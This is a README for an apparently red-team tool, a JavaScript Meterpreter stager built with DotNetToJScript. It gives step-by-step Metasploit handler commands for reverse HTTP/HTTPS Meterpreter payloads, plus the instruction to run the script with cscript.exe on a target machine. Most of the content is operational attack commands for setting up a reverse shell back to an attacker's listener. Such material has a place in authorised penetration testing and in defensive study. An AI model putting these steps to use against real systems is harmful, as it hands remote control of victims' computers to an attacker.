```
     ____. ___________      __      ___.       _____          __                
    |    |/   _____/  \    /  \ ____\_ |__    /     \   _____/  |_  ___________ 
    |    |\_____  \\   \/\/   // __ \| __ \  /  \ /  \_/ __ \   __\/ __ \_  __ \
/\__|    |/        \\        /\  ___/| \_\ \/    Y    \  ___/|  | \  ___/|  | \/
\________/_______  / \__/\  /  \___  >___  /\____|__  /\___  >__|  \___  >__|   
                 \/       \/       \/    \/         \/     \/          \/       
```
### JavaScript Reversed HTTP/HTTPS Meterpreter Stager - by Cn33liz 2017
CSharp Meterpreter Stager build by Cn33liz and embedded within JavaScript using DotNetToJScript from James Forshaw
https://github.com/tyranid/DotNetToJScript

This Stager is Proxy aware and should run on x86 as well as x64

```
Usage:
Change RHOST, RPORT and UseHTTPS to suit your needs.

Start Msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https <- When running HTTPS Payload from x64 version of cscript.exe
set PAYLOAD windows/x64/meterpreter/reverse_http <- When running HTTP Payload from x64 version of cscript.exe
set PAYLOAD windows/meterpreter/reverse_https <- When running HTTPS Payload from x86 version of cscript.exe
set PAYLOAD windows/meterpreter/reverse_http <- When running HTTP Payload from x86 version of cscript.exe
set LHOST 0.0.0.0
set LPORT 443
set EnableUnicodeEncoding true
set EnableStageEncoding true
set ExitOnSession false
exploit -j 

Then run: cscript.exe JSWebMeter.js on Target
```
